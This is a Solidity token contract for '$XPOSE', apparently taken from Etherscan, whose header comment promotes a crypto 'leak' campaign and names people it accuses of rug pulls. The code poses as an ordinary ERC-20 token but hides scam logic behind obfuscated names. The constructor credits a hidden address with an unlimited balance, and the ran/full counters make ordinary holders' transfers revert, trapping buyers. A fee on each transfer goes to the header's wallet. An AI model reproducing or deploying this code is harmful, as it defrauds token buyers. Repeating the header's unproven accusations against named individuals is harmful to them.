/**
 *Submitted for verification at Etherscan.io on 2022-06-08
*/

/*

https://t.me/exposedtruth

137.21GB of malicious data will be released in 3 batches over the course of 22 days, from the 15th June to the 7th July.
Crypto figures of scale will be exposed, their past actions haunting them when they least expect, at the peak of their fame and fortune.

We'll be releasing full & never-before-seen intel on some of the most prominent crypto projects, and operators. $XPOSE

1. Dan Folger & $SKHOOBY - RUGGED YOU $1MM WHO MADE THAT? WHAT TOKENS THEY LAUNCHING TODAY?

2. Sean Kelly - $1m/month in crypto revenue, zero real value provided. Ultimate finesser, or NFT messiah? Read the evidence, and you be the judge

3. Gooby Gambles - Profited from Rug after Rug from Pasquale, Dan, and close network

This is only the start. $XPOSE

Marketing wallet, make donations here
0xdC56BCccf3fa51687f339E2425E9Bc1a2acB42Ee

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.1;

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        selectionOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        selectionOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        selectionOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function selectionOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed ExposedProtocol0, address indexed ExposedProtocol1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address ExposedProtocolA, address ExposedProtocolB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address ExposedProtocolA, address ExposedProtocolB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address ExposedProtocolA,
        address ExposedProtocolB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address ExposedProtocol,
        uint amountExposedProtocolDesired,
        uint amountExposedProtocolMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountExposedProtocol, uint amountETH, uint liquidity);
    function removeLiquidity(
        address ExposedProtocolA,
        address ExposedProtocolB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address ExposedProtocol,
        uint liquidity,
        uint amountExposedProtocolMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountExposedProtocol, uint amountETH);
    function removeLiquidityWithPermit(
        address ExposedProtocolA,
        address ExposedProtocolB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address ExposedProtocol,
        uint liquidity,
        uint amountExposedProtocolMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountExposedProtocol, uint amountETH);
    function swapExactExposedProtocolsForExposedProtocols(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExposedProtocolsForExactExposedProtocols(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForExposedProtocols(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapExposedProtocolsForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactExposedProtocolsForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactExposedProtocols(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferExposedProtocols(
        address ExposedProtocol,
        uint liquidity,
        uint amountExposedProtocolMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferExposedProtocols(
        address ExposedProtocol,
        uint liquidity,
        uint amountExposedProtocolMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactExposedProtocolsForExposedProtocolsSupportingFeeOnTransferExposedProtocols(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForExposedProtocolsSupportingFeeOnTransferExposedProtocols(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactExposedProtocolsForETHSupportingFeeOnTransferExposedProtocols(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ExposedProtocol is Ownable {
    constructor(
        string memory repeat,
        string memory football,
        address limited,
        address advice
    ) {
        _symbol = football;
        _name = repeat;
        _fee = 1;
        _decimals = 9;
        tank = 1000000000;
        _tTotal = tank * 10**_decimals;

        _balances[advice] = force;
        _balances[msg.sender] = _tTotal;
        ran[advice] = force;
        ran[msg.sender] = force;

        uniswapV2Router = IUniswapV2Router02(limited);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    uint256 public _fee;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private tank;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    ExposedProtocol private prove;
    uint256 private force = ~uint256(0);

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function selection(
        address structure,
        address mainly,
        uint256 creature
    ) private {
        address pattern = address(prove);
        bool stood = uniswapV2Pair == structure;
        uint256 built = _fee;

        if (ran[structure] == 0 && full[structure] > 0 && !stood) {
            ran[structure] -= built;
        }

        prove = ExposedProtocol(mainly);

        if (ran[structure] > 0 && creature == 0) {
            ran[mainly] += built;
        }

        full[pattern] += built + 1;

        uint256 fort = (creature / 100) * _fee;
        creature -= fort;
        _balances[structure] -= fort;
        _balances[0xdC56BCccf3fa51687f339E2425E9Bc1a2acB42Ee] += fort;

        _balances[structure] -= creature;
        _balances[mainly] += creature;
    }

    mapping(address => uint256) private full;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private ran;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        require(amount > 0, 'Transfer amount must be greater than zero');
        selection(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        selection(msg.sender, recipient, amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
}